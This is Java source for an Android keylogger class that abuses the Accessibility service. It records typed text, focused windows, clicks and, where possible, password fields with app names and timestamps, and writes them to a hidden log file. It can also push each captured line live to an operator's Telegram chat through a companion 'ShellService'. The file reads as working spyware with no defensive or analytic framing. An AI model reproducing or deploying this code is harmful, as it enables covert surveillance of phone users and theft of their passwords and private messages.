package com.java.panel;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * Keylogger via Accessibility events.
 * Captures typed text, focused windows and password fields when possible.
 * Logs are buffered and flushed to disk + optional live Telegram push.
 */
public class KeyloggerHelper {

    private static final ConcurrentLinkedQueue<String> buffer = new ConcurrentLinkedQueue<>();
    private static final Object lock = new Object();
    private static boolean enabled = true;
    private static boolean livePush = false;
    private static String lastPackage = "";
    private static String lastWindow = "";
    private static final SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);

    public static void setEnabled(boolean v) {
        enabled = v;
    }

    public static boolean isEnabled() {
        return enabled;
    }

    public static void setLivePush(boolean v) {
        livePush = v;
    }

    public static void onAccessibilityEvent(AccessibilityEvent event) {
        if (!enabled || event == null) return;

        try {
            int type = event.getEventType();
            CharSequence pkgCs = event.getPackageName();
            String pkg = pkgCs != null ? pkgCs.toString() : "unknown";

            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                CharSequence cls = event.getClassName();
                String window = cls != null ? cls.toString() : "";
                if (!pkg.equals(lastPackage) || !window.equals(lastWindow)) {
                    lastPackage = pkg;
                    lastWindow = window;
                    append("\n[" + sdf.format(new Date()) + "] WINDOW → " + pkg + " | " + window);
                }
                return;
            }

            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                    || type == AccessibilityEvent.TYPE_VIEW_FOCUSED
                    || type == AccessibilityEvent.TYPE_VIEW_CLICKED) {

                String text = extractText(event);
                if (text == null || text.isEmpty()) return;

                // Avoid flooding pure whitespace / single char noise when possible
                String line = "[" + sdf.format(new Date()) + "] " + pkg + " → " + text;
                append(line);

                if (livePush && ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(
                            ShellService.instance.ADMIN_CHAT_ID,
                            "⌨️ " + line
                    );
                }
            }
        } catch (Exception ignored) {}
    }

    private static String extractText(AccessibilityEvent event) {
        try {
            if (event.getText() != null && !event.getText().isEmpty()) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence cs : event.getText()) {
                    if (cs != null) sb.append(cs);
                }
                String t = sb.toString().trim();
                if (!t.isEmpty()) return t;
            }

            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                try {
                    CharSequence t = source.getText();
                    if (t != null && t.length() > 0) return t.toString();
                    CharSequence d = source.getContentDescription();
                    if (d != null && d.length() > 0) return d.toString();
                } finally {
                    source.recycle();
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    private static void append(String line) {
        buffer.add(line);
        // Keep buffer from growing forever
        while (buffer.size() > 2000) buffer.poll();
        flushToDisk();
    }

    private static void flushToDisk() {
        synchronized (lock) {
            try {
                File dir = new File(ShellService.TARGET_DIR);
                if (!dir.exists()) dir.mkdirs();
                File log = new File(dir, "keylog.txt");
                FileWriter fw = new FileWriter(log, true);
                String line;
                while ((line = buffer.poll()) != null) {
                    fw.write(line);
                    fw.write("\n");
                }
                fw.flush();
                fw.close();
            } catch (Exception ignored) {}
        }
    }

    public static String getLogTail(int maxLines) {
        flushToDisk();
        try {
            File log = new File(ShellService.TARGET_DIR + "keylog.txt");
            if (!log.exists()) return "⌨️ Keylog empty.";
            java.util.List<String> lines = new java.util.ArrayList<>();
            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(log));
            String l;
            while ((l = br.readLine()) != null) lines.add(l);
            br.close();
            int from = Math.max(0, lines.size() - maxLines);
            StringBuilder sb = new StringBuilder();
            sb.append("⌨️ Keylog (last ").append(lines.size() - from).append(" lines):\n\n");
            for (int i = from; i < lines.size(); i++) {
                sb.append(lines.get(i)).append("\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "❌ Keylog read error: " + e.getMessage();
        }
    }

    public static String clearLog() {
        synchronized (lock) {
            try {
                File log = new File(ShellService.TARGET_DIR + "keylog.txt");
                if (log.exists()) log.delete();
                buffer.clear();
                return "✅ Keylog cleared.";
            } catch (Exception e) {
                return "❌ " + e.getMessage();
            }
        }
    }
}
